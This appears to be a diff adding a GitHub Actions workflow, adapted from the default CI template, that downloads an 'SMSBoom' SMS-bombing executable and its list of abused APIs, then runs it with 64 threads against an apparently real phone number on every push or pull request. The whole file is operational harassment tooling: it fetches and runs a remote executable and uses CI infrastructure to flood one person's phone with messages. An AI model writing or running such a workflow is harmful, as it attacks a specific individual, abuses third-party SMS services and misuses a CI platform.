@@ -1,0 +1,41 @@
+# This is a basic workflow to help you get started with Actions
+
+name: CI
+
+# Controls when the workflow will run
+on:
+  # Triggers the workflow on push or pull request events but only for the "main" branch
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+  # Allows you to run this workflow manually from the Actions tab
+  workflow_dispatch:
+
+# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+jobs:
+  # This workflow contains a single job called "build"
+  build:
+    # The type of runner that the job will run on
+    runs-on: windows-latest
+
+    # Steps represent a sequence of tasks that will be executed as part of the job
+    steps:
+      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
+      - uses: actions/checkout@v3
+
+      # Runs a single command using the runners shell
+      - name: Get SMS-Bomb Main Program
+        run: wget http://github.com/OpenEthan/SMSBoom/releases/download/main/smsboom.exe
+      # Runs a single command using the runners shell
+      - name: Update ports
+        run: |
+          smsboom.exe update
+          rm api.json
+          wget https://github.com/OpenEthan/SMSBoom/raw/18bc9d1b6d14b4c458e004cd964d9aefb3780aa0/api.json
+          
+      # Runs a set of commands using the runners shell
+      - name: Start Bomb
+        run: |
+          smsboom_pyinstall.exe run -t 64 -p 17853287513-f 5 -i 30
